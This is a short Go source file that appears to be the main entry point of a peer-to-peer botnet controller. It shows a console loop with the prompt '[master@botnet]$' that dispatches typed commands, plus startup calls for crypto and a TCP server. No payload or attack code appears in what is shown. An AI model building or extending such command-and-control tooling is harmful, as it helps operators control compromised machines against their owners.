package main

import (
	"fmt"
	"bufio"
	"os"
	"strings"
)

func initInterface() {

	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Welcome to the P2P Network interface")
	fmt.Println("---------------------------------------")

	for {
		fmt.Print("[master@botnet]$ ")

		input, _ := reader.ReadString('\n');
		input = strings.Replace(input, "\n", "", -1)

		args := strings.Split(input, " ")

		h := &CmdHandle {
			Name: args[0],
			Args: args[1:],
		}

		ExecCommand(h)
	}
}

func main() {
	LoadCommands()
  InitCrypto()
  go InitTCPServ()
	initInterface()
}
